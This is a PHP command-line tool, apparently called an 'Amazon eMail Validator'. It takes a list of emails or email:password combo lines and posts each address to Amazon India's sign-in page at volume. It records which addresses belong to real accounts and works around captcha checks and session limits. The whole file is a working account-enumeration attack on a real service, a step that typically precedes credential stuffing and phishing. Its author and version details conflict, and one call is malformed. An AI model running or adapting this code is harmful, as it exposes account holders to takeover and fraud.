<?php

/**
 * PLEASE DON'T CHANGE THIS
 *
 * Amazon eMail Validator [ BETA VERSION 1.0.1 ]
 * Author: Faiz Ainurrofiq (https://paisx.net/)
 * Link: https://github.com/paisx/
 */

ini_set("memory_limit", '-1');
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";

echo banner();
enterlist:
$listname = readline(" Enter list: ");
if(empty($listname) || !file_exists($listname)) {
	echo" [?] list not found".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline(" Save to dir (default: valid): ");
$dir = empty($savedir) ? "valid" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
reqemail:
$reqemail = readline(" Request email per second (*max 10) ? ");
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 3 : $reqemail;
if($reqemail > 10) {
	echo " [*] max 10".PHP_EOL;
	goto reqemail;
}
$delpercheck = readline(" Delete list per check? (y/n): ");
$delpercheck = strtolower($delpercheck) == "y" ? true : false;

$no = 0;
$total = count($lists);
$live = 0;
$dead = 0;
$unknown = 0;
$c = 0;

echo PHP_EOL;
$getdata = getData();
if(!is_array($getdata) && $getdata == "captcha") die(PHP_EOL."* CAPTCHA".PHP_EOL);
$rollingCurl = new \RollingCurl\RollingCurl();
foreach($lists as $list) {
	$c++;
	if(strpos($list, "|") !== false) list($email, $pwd) = explode("|", $list);
	else if(strpos($list, ":") !== false) list($email, $pwd) = explode(":", $list);
	else $email = $list;
	if(empty($email)) continue;
	if($c%60000==0) {
		if(file_exists(dirname(__FILE__)."/../amzval.cook")) unlink(dirname(__FILE__)."/../amzval.cook");
		$getdata = getData();
	}
	$email = str_replace(" ", "", $email);
	$header = array("accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding: gzip, deflate, br","accept-language: en-US,en;q=0.9","cache-control: max-age=0","content-type: application/x-www-form-urlencoded","origin: https://www.amazon.in","referer: https://www.amazon.in/ap/signin?openid.pape.max_auth_age=900&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fap%2Fcnep%3Fie%3DUTF8%26orig_return_to%3Dhttps%253A%252F%252Fwww.amazon.in%252Fgp%252Fcss%252Faccount%252Finfo%252Fview.html%253Fie%253DUTF8%2526ref_%253Dhp_ss_cnep%26openid.assoc_handle%3Dinamazon%26pageId%3Dinamazon&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inamazon&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0","upgrade-insecure-requests: 1","user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.118");
	$data = "openid.return_to=".$getdata["openidreturnto"]."&prevRID=".$getdata["prevrid"]."&workflowState=".$getdata["workflowstate"]."&appActionToken=".$getdata["appactiontoken"]."&appAction=SIGNIN_PWD_COLLECT&email=".$email."&password=&create=0";
	$rollingCurl->setOptions(array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_ENCODING => "gzip", CURLOPT_COOKIEJAR => dirname(__FILE__)."/../amzval.cook", CURLOPT_COOKIEFILE => dirname(__FILE__)."/../amzval.cook", CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4))->post("https://www.amazon.in/ap/signin?email=".$email."&list=".$list, $data, $header);
}
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
	global $listname, $dir, $delpercheck, $no, $total, $live, $dead, $unknown;
	$no++;
	parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
	$email = $params["email"];
	$list = $params["list"];
	$x = $request->getResponseText();
	$deletelist = 1;
	echo " [".date("H:i:s")." ".$no."/".$total." from ".$listname." to ".$dir."] [ DracOS ]";
	if(preg_match("#We cannot find an account with that email address#", $x)) {
		$dead++;
		file_put_contents("dead.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["LR"]." DEAD".color()["WH"]." => ".$email;
	}else{
		$live++;
		file_put_contents("live.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["LG"]." LIVE".color()["WH"]." => ".$email;
	}
	echo color()["LW"]." | ".color()["YL"]."Amazon ".color()["CY"]."eMail ".color()["LR"]."Validator 2.0 --".color()["WH"];
	if($delpercheck && $deletelist) {
    	$getfile = file_get_contents("../".$listname);
    	$awal = str_replace("\r", "", $getfile);
    	$akhir = str_replace($list."","", "", $awal);
    	file_put_contents("../".$listname, $akhir);
	}
	echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();
if($delpercheck && count(explode("\n", file_get_contents("../".$listname))) <= 1) unlink("../".$listname);
echo PHP_EOL." -- Total: ".$total." - Live: ".$live." - Dead: ".$dead." - Unknown: ".$unknown.PHP_EOL." Saved to dir \"".$dir."\"".PHP_EOL;

function banner() {
	$out = color()["LW"]."     _____________".color()["MG"]."______________".color()["CY"]."_______________".color()["LM"]."_____________
    |                                                       |
    |           ".color()["LG"]."Amazon ".color()["CY"]."eMail ".color()["MG"]."Validator [ BETA VERSION ]     |
    |  Latest ".color()["LR"]."Update on ".color()["LW"]."Sunday, ".color()["CY"]."June 13, 2020 at".color()["MG"]." 01:13:50   |
    |      Author: ".color()["LW"]."JIM GEOVENDI ".color()["MG"]."(DracOS KALI LINUX)         |
    |_____________".color()["LG"]."______________".color()["CY"]."_______________".color()["MG"]."_____________|".color()["LW"]."
                     STRONG IN BROTHERHOOD".color()["WH"]."
".color()["WH"].PHP_EOL.PHP_EOL;
	return $out;
}
function color() {
	return array(
		"LW" => (OS == "linux" ? "\e[1;37m" : ""),
		"WH" => (OS == "linux" ? "\e[0m" : ""),
		"YL" => (OS == "linux" ? "\e[1;33m" : ""),
		"LR" => (OS == "linux" ? "\e[1;31m" : ""),
		"MG" => (OS == "linux" ? "\e[0;35m" : ""),
		"LM" => (OS == "linux" ? "\e[1;35m" : ""),
		"CY" => (OS == "linux" ? "\e[1;36m" : ""),
		"LG" => (OS == "linux" ? "\e[1;32m" : "")
	);
}
function getData() {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://www.amazon.in/gp/css/account/info/view.html?ie=UTF8&ref_=hp_ss_cnep");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__)."/../amzval.cook");
	curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__)."/../amzval.cook");
	curl_setopt($ch, CURLOPT_ENCODING, "gzip");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
	$x = curl_exec($ch);
	curl_close($ch);
	if(preg_match("#Robot Check#", $x)) return "captcha";
	$out = array();
	$out["openidreturnto"] = getStr($x, "openid.return_to\" value=\"", "\"");
	$out["workflowstate"] = getStr($x, "workflowState\" value=\"", "\"");
	$out["appactiontoken"] = getStr($x, "appActionToken\" value=\"", "\"");
	$out["prevrid"] = getStr($x, "prevRID\" value=\"", "\"");
	return $out;
}
function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[1]);
    return $b[0];
}
function curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $x = curl_exec($ch);
    curl_close($ch);
    return $x;
}